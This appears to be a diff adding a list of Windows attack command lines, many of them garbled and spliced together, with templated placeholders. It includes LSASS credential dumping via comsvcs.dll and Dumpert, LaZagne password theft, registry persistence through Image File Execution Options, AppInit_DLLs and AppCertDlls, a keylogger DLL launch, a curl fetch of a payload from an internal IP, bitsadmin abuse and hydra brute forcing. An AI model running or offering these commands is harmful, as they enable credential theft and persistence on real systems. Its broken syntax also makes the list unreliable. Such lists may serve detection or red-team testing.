@@ -1,0 +1,64 @@
+$ shortcut = `` ( $ `` ( $ ( default ) '' '' ; ; ;
+reg `` hklm\system\currentcontrolset\control\session manager\environment `` c : /v `` nt\currentversion\winlogon\specialaccounts\userlist '' /t reg_sz /d `` $ { executable_binary } '' /f
+rdrleakdiag.exe /p $ { interface }
+namp -sn $ { user_name } -force )
+net user $ { domain controllers '' $ { output_file } $ { local_file_path }
+$ shortcutlocation = defaultaccount '' ''
+-u $ { range_start } /domain
+python -c `` hkcu : :frombase64string ( $ { range_start } ;
+vsdiagnostics.exe start $ { file_name }
+reg add `` hkey_local_machine\system\currentcontrolset\control\session manager\appcertdlls '' `` -sn
+rundll32 keylogger_dll.dll , keylog
+python -c `` .\lazagne .. exe all ''
+nslookup $ { ip }
+mkdir `` $ { command } /add
+out-minidump.exe
+.\outflank-dumpert.exe dump
+reg add `` domain shortcutlocation '' /domain
+cmdkey /list
+get-ciminstance -classname win32_desktop
+reg add `` hklm\software\microsoft\windows nt\currentversion\image file execution options\svchost.exe '' /v /ve /v debugger /d $ { binary__file_path } ''
+lazagne.exe all
+icacls c : \windows\system32\comsvcs.dll , minidump ( get-process lsass ) .id c : \windows\system32\comsvcs.dll , ( ' '' ) -class -startaddress $ `` command } ''
+`` a '' c : cor_profiler '' ' }
+reg add `` hklm\system\currentcontrolset\control\session manager\environment '' /v reg_dword /v `` `` lsadbextpt '' '' /f
+reg add `` hklm\software\microsoft\windows nt\currentversion\windows '' /v `` appinit_dlls '' /t reg_sz /d `` $ { mimilib.dll_path } '' /f
+reportingmode $ : administrators '' = $ { flag }
+get-childitem $ { vbs_script }
+nmap -- unprivileged -p $ { mask }
+quser
+bitsadmin.exe /setnotifycmdline $ { domain }
+psexec.exe \\ $ { filter = : execution -name atomic_red_team onlogon . , $ ( 0 % temp % disable , 0 0 } /d : /launch '' $ { target_ip } -u $ { '' temp % \ $ { password }
+start-service -name `` $ { domain }
+filename_regex -name : $ { mask }
+out-minidump.exe
+put $ { domain }
+cmdkey /list
+curl http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+cmdkey.exe /list
+hydra -l $ ( username ) ;
+nmap -o $ { { id /interactive /every : $ { path )
+dir c : \windows\system32\ $ { username } binpath= '' /add /d $ { password }
+`` $ i = `` $ i ; ;
+-destination appdata\microsoft\windows\start archive_file.py $ { user_name } $ { command }
+get-wmiobject win32_computersystem | select-object -expandproperty username
+rundll32 popcalc.dll , popcalc
+reg add `` hkey_local_machine\software\microsoft\windows nt\currentversion\winlogon '' ) /v reg_dword /d 1
+open $ { domain }
+del $ { registry_path }
+net user = $ { username } $ { username } \appdata\local\temp\lsass.dmp
+wt.exe $ { command }
+vsiisexelauncher.exe -p $ { message } \ $ true , [ convertto-securestring { attached } /user : $ { path } , $ ( { binary__file_path } '' '' /f
+del $ { shadow account service_name } '' !
+net user administrator /domain
+reg add `` hklm\software\microsoft\windows nt\currentversion\windows '' /v `` appinit_dlls '' /f
+echo `` ip }
+python -c delete $ { bits_job_name } $ { new_time }
+auditpol -query `` cim * : disable
+set programw6432= $ { ads_zip } } -w { -d } $ { command_file }
+lazagne.exe windows -group
+ffuf -w $ { path } -p $ { password }
+query user /server : # { driver_name }
+wmix ueraccount get /all /format : $ { binary__file_path } '' /domain :
+bitsadmin.exe /addfile $ { source_file } $ { email_address }
+whoami
